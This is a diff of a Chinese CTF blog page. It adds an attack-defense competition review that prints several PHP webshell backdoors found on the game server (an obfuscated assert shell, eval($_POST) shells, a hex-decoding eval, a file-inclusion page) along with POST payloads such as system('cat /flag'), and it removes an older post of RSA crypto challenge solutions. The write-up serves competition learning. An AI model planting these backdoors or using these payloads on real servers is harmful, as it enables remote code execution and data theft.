@@ -151,6 +151,114 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/23/2021ad/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="expansehi">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/23/2021ad/" class="post-title-link" itemprop="url">2021ad</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-23 12:17:29 / 修改时间：12:18:10" itemprop="dateCreated datePublished" datetime="2021-11-23T12:17:29+08:00">2021-11-23</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="年ad">2021年AD：</h1>
+<h2 id="准备工作">准备工作：</h2>
+<h3 id="问题">问题：</h3>
+<p>1，对协议的不了解导致开局很久才登陆上服务器，浪费了首轮的很多时间。</p>
+<p>2，没有太过于明确分工， 交流不是很充分，在反馈沟通上还是欠缺。</p>
+<p>3，准备不足导致工具使用和代码使用上落后于其他人。</p>
+<h2 id="工具">工具：</h2>
+<table>
+<thead>
+<tr class="header">
+<th style="text-align: center;">Xshell</th>
+<th style="text-align: center;">xftp</th>
+<th>python</th>
+<th>dsafe</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">连接服务器</td>
+<td style="text-align: center;">图形化操作</td>
+<td>写代码</td>
+<td>检测简易漏洞</td>
+</tr>
+</tbody>
+</table>
+<h2 id="注意事项">注意事项：</h2>
+<p>1，先关闭系统的防御软件，以防直接删除漏洞文件。</p>
+<h2 id="详细记录">详细记录：</h2>
+<h3 id="漏洞">漏洞：</h3>
+<h4 id="config.php">config.php</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$a</span> = strtr(<span class="string">&#x27;azxcvt&#x27;</span>,<span class="string">&#x27;zxcv&#x27;</span>,<span class="string">&#x27;sser&#x27;</span>);</span><br><span class="line">    <span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用POST传参即可。如</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">password</span>=system(<span class="string">&quot;ls&quot;</span>)<span class="comment">;</span></span><br><span class="line"><span class="attr">password</span>=system(<span class="string">&quot;cat /flag&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+<h5 id="注意事项-1">注意事项：</h5>
+<p>php传参时，成功和失败的分析：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">password=system(<span class="string">&quot;cat /flag&quot;</span>);  <span class="comment"># 成功</span></span><br><span class="line">password =system(<span class="string">&quot;cat /flag&quot;</span>);  <span class="comment"># 失败</span></span><br><span class="line">password= system(<span class="string">&quot;cat /flag&quot;</span>);  <span class="comment"># 成功</span></span><br><span class="line"><span class="comment">//在等号前面为变量，如果加入空格会被认为是变量的一部分从而传参失败</span></span><br></pre></td></tr></table></figure>
+<h4 id="php">404.php</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">header(<span class="string">&#x27;HTTP/1.1 404 Not Found&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span>&lt;/strong&gt;</span><br></pre></td></tr></table></figure>
+<p>include()会包含并运行指定文件，而且由于是GET传参，可先包含文件，再执行文件中的命令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//172.17.135.39:8006/404.php?file=config.php</span></span><br><span class="line">password=system(<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h4 id="js.php">.js.php</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;password&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$password</span>]))&#123;</span><br><span class="line">    <span class="variable">$hex</span> = <span class="variable">$_POST</span>[<span class="variable">$password</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$hex</span>) - <span class="number">1</span>; <span class="variable">$i</span> += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$string</span> .= chr(hexdec(<span class="variable">$hex</span>[<span class="variable">$i</span>] . <span class="variable">$hex</span>[<span class="variable">$i</span> + <span class="number">1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$string</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>代码中包含一个强制执行字符串，其中string变量的内容会被执行。</p>
+<h4 id="index.php">index.php</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//location end</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ji&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>同样是在文件末尾包含了一个eval函数，利用POST传参，由于这时无法看到（修正），在检查-网络-搜索中搜索flag，在响应标签的201行可以发现目的数据。</p>
+<h4 id="varwwwhtmlpublichomedefault404.html">/var/www/html/Public/Home/default/404.html</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;a title=<span class="string">&quot;官方网站&quot;</span> href=<span class="string">&quot;http://www.xyhcms.com&quot;</span>&gt;XYHCMS&lt;/a&gt; [ <span class="meta">&lt;?php</span> var_dump(file_get_contents(<span class="variable">$file</span>)); <span class="meta">?&gt;</span> ]&lt;/p&gt;</span><br><span class="line"><span class="comment">//file_get_contents 是将文件读入一个字符串</span></span><br><span class="line"><span class="comment">//var_dump 是打印变量的相关信息</span></span><br></pre></td></tr></table></figure>
+<h4 id="section"></h4>
+<h4 id="section-1"></h4>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/12/RSA_RECORD/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1075,102 +1183,11 @@ if (isset($_REQUEST['idp'])) {
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/29/RSA%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="expansehi">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/09/29/RSA%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">RSA做题思路</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-09-29 21:33:35" itemprop="dateCreated datePublished" datetime="2021-09-29T21:33:35+08:00">2021-09-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-31 17:35:45" itemprop="dateModified" datetime="2021-10-31T17:35:45+08:00">2021-10-31</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">题目复现</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <hr />
-<h1 id="招新cryptography类题目复现">2021.10 招新Cryptography类题目复现</h1>
-<h2 id="no.1-base">NO.1 Base</h2>
-<p>#R05CREVPQlVHWTNESU0yRkdVWVRHTlpXR0laVEdOWllHUTRUS01SVkdNMkVDTVJZR00zVElOSlRHWTJVR05SVkc0WlRJUVpTSUkzREVOU0VHTkJUSU9CV0lRWkRPTVJVR1EzVEtSQlRHUTNER00yREc0NFRNTVJWSEEyVFFNWldHUTJET05aV0c0MkRJTVJXR000VEVOSlhHWTJES05aWUdJM0RJTVpWSVk9PT09PT0= #想法：结尾以一个=结束，字符串包括0-9，a-z,A-Z，考虑到可能是Base64的编码方式，经过转换可以得到以下内容 #GNBDEOBUGY3DIM2FGUYTGNZWGIZTGNZYGQ4TKMRVGM2ECMRYGM3TINJTGY2UGNRVG4ZTIQZSII3DENSEGNBTIOBWIQZDOMRUGQ3TKRBTGQ3DGM2DG44TMMRVHA2TQMZWGQ2DONZWG42DIMRWGM4TENJXGY2DKNZYGI3DIMZVIY====== #观察可以发现=<em>6结尾，段落字符串包含A-Z,2-4可初步判断是Base32编码方式，对其进行解密 #3B2846643E51376233784952534A283745365C65734C2B626D3C486D2724475D34633C79625858364477674426392576457826435F #12line的数据中，包含了A-F,1-7,可以发现所含字符种类的减少，判定为Base16编码 #;(Fd&gt;Q7b3xIRSJ(7E6+bm&lt;Hm'$G]4c&lt;ybXX6DwgD&amp;9%vEx&amp;C_ #在14行的数据中可以发现字符种类相比之前的增多，根据BASEx编码的方式，x越大所能包含的字符越多从BASE92开始尝试解密 #GKCTF{c0862b7d-8947-4709-b52e-74f5a80adf0c} #此题结束 #no2.RSA1 #当e = 5，n = 247时，此时私钥d = ? flag格式GKCTF{d+372364782364902345972} #已知使用的是RSA算法进行加密，但是只需求解逆元d即可解出题目答案，因此需要对rsa加密的原理进行初步了解 前置小知识： 模运算：如在一个除法运算中。正整数n，整数a，用a/n，余数为r可得到 a = qn+r（0《r《n）在此过程用a mod n表示余数r，即mod表示前面的整数除以后面的整数所得的余数。 rsa算法简介：https://zh.wikipedia.org/wiki/RSA加密演算法 在数学能力不足的情况下可初步认为实现一个rsa加密过程所需要得知的数据有p q(pq为随机的大质数) n（p</em>q） e(随机数)+python若干已知可搜索代码 所需要的python3库有：gmpy2，math，libnum,crypto 在逆向解题时可以将上述过程逆向求解 #rsa1 #当e = 5，n = 247时，此时私钥d = ? flag格式GKCTF{d+372364782364902345972} #对题目分析可知，已经给出e,n的情况下，利用d为e模n的逆元，有等式：5d=k欧拉（n）+1 ，可得知5<em>173=216</em>4+1 d=173 也可以用求解逆元的python代码求解</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,math,libnum</span><br><span class="line">n = <span class="number">247</span></span><br><span class="line">e = <span class="number">5</span></span><br><span class="line">p =<span class="number">13</span></span><br><span class="line">q = <span class="number">19</span>  <span class="comment">#已对n进行了分解</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = libnum.modular.invmod(e, phi)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(d+<span class="number">372364782364902345972</span>)</span><br></pre></td></tr></table></figure>
-<p>#此题结束</p>
-<h2 id="no.2-rsa2">NO.2 rsa2</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;xxxxxxxxx&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"><span class="comment">#p = 8295060918182123086529954804457591771595859196866703668935550464411971096001209655693961477877492176270927130171265553668119697631371310340208912981287823</span></span><br><span class="line"><span class="comment">#q = 12377495661382165101505333342973584396799606742367643146931847192885491168024340382524326191977310276197079533009866235586823791767430602033938123746440283</span></span><br><span class="line"><span class="comment">#c = 43405037741992830489999242106013528486995909531366634207485923975455812270021325488457540379716092907227733486594977478749656774348298533871141205590950920682210224271387683169091224829310512918597194475627703895654121834516964442517362297801225116093107942862842085685549307740605628348328889543664429027036</span></span><br></pre></td></tr></table></figure>
-<h3 id="分析">分析：</h3>
-<p>观察此题可以发现其形成过程较为正常，采用正常的求解思路，求d并逆向即可需要注意的是要导入libnum库将字符串转化</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span> </span><br><span class="line">n = p*q </span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>) </span><br><span class="line">d = libnum.modular.invmod(e, phi) </span><br><span class="line">m =<span class="built_in">pow</span>(c,d,n) </span><br><span class="line"><span class="built_in">print</span>(m) </span><br><span class="line">m = libnum.n2s(<span class="built_in">pow</span>(c, d, n)) </span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
-<h2 id="no3.rsa3fix">NO3.rsa3fix</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;xxxxxxxxxx&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=gmpy2.next_prime(p)</span><br><span class="line">n=p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 143363836826231338729056049283956730867732414178438702007505612141669038162506887276797074940321479684442371423665415783765707759104380850385817733108462915373974857865184257324481256350109666538457406439214083651221563347191143931954845381704207749736259782728340199374131177390661967920447476896305253252287</span></span><br><span class="line"><span class="comment">#c = 39900642533536334094959292244230926997420133795872117552067282893555342116660285809315275396738476920987307712365380080806696249406850314529601154774788154899294247318420860891369796862133303007541621246180792852057456479842745477077089966273067231292385056046286707406462204080834830615635991614829090464676</span></span><br></pre></td></tr></table></figure>
-<h3 id="分析-1">分析：</h3>
-<p>观察代码可知其中p、q为相近大小的质数 可以采用yafu进行分解并解题</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> gmpy2,libnum </span><br><span class="line">n = <span class="number">143363836826231338729056049283956730867732414178438702007505612141669</span> 038162506887276797074940321479684442371423665415783765707759104380850 <span class="number">385817733108462915373974857865184257324481256350109666538457406439214</span> 083651221563347191143931954845381704207749736259782728340199374131177 <span class="number">390661967920447476896305253252287</span> </span><br><span class="line">c =<span class="number">399006425335363340949592922442309269974201337958721175520672828935553</span> <span class="number">421166602858093152753967384769209873077123653800808066962494068503145</span> <span class="number">296011547747881548992942473184208608913697968621333030075416212461807</span> <span class="number">928520574564798427454770770899662730672312923850560462867074064622040</span> <span class="number">80834830615635991614829090464676</span> </span><br><span class="line">p = <span class="number">119734638608145194805971798080695268116800917495850399890442499524083</span> <span class="number">595623289143808616788384858567090486181377566337051673354016785183094</span> <span class="number">15222816271931409</span> </span><br><span class="line">q = <span class="number">119734638608145194805971798080695268116800917495850399890442499524083</span> <span class="number">595623289143808616788384858567090486181377566337051673354016785183094</span> <span class="number">15222816271931343</span> </span><br><span class="line">e = <span class="number">65537</span> </span><br><span class="line">n = p*q </span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>) </span><br><span class="line">d = libnum.modular.invmod(e, phi) </span><br><span class="line">m =<span class="built_in">pow</span>(c,d,n) <span class="built_in">print</span>(m) </span><br><span class="line">m = libnum.n2s(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
-<h2 id="no.4-rsa4">NO.4 rsa4</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,libnum,math</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;xxxxxxxxx&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p1=getPrime(<span class="number">512</span>)</span><br><span class="line">p2=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1=p1*q</span><br><span class="line">n2=p2*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n1 =&quot;</span>,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n2 =&quot;</span>,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"><span class="comment">#n1 = 94884177404102774822427817554026673720426045553229294164196365889868241209608198699825736765740994266602096819122742585513501193889324896436037215835611197604584097026126384952616166688608861592747633795387512620398959276473021649145217082140578045946571540919651239006361411412966855913642687457034906005481</span></span><br><span class="line"><span class="comment">#n2 = 102092062624102434903363841516866371627091881788106503630597091930877220050525498406865097313998866123339505287817724583500790338080221223615935355657880374600271600595223677064220029948502765382371862642367611565399975161981531714989641057593633902412383389249539558261934903587042257061713949592876287829881</span></span><br><span class="line"><span class="comment">#c = 10161386666467145208857785448881081828349023698013253141457707759937214875961033355661950148076700293535500076441730371075685493667049097245041947126526573496523864539273787569768972556184491634756602821320824969932806636641016492987667710427328627010446039020111688428659154424498965489762890027774092953101</span></span><br></pre></td></tr></table></figure>
-<h3 id="分析-2">分析：</h3>
-<p>首先可以发现本题的加密采用的是n1的过程 所以求解质因数最终要用n1的形成过程去求解，而由代码可知p（x），q均为质数，所以可以知道q即为n1 n2的最大公约数，用n1对q进行取余运算即可求出另一个质因数</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,libnum,math</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n1 = <span class="number">94884177404102774822427817554026673720426045553229294164196365889868241209608198699825736765740994266602096819122742585513501193889324896436037215835611197604584097026126384952616166688608861592747633795387512620398959276473021649145217082140578045946571540919651239006361411412966855913642687457034906005481</span></span><br><span class="line">n2 = <span class="number">102092062624102434903363841516866371627091881788106503630597091930877220050525498406865097313998866123339505287817724583500790338080221223615935355657880374600271600595223677064220029948502765382371862642367611565399975161981531714989641057593633902412383389249539558261934903587042257061713949592876287829881</span></span><br><span class="line">c = <span class="number">10161386666467145208857785448881081828349023698013253141457707759937214875961033355661950148076700293535500076441730371075685493667049097245041947126526573496523864539273787569768972556184491634756602821320824969932806636641016492987667710427328627010446039020111688428659154424498965489762890027774092953101</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">q =GCD(n1,n2)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">p =n1//q   <span class="comment">#取余运算，而不是除法运算，需要用//  ，而不是/</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = libnum.modular.invmod(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">m = libnum.n2s(<span class="built_in">pow</span>(c, d, n)) </span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
 
 
 
@@ -1235,7 +1252,7 @@ if (isset($_REQUEST['idp'])) {
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1247,7 +1264,7 @@ if (isset($_REQUEST['idp'])) {
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
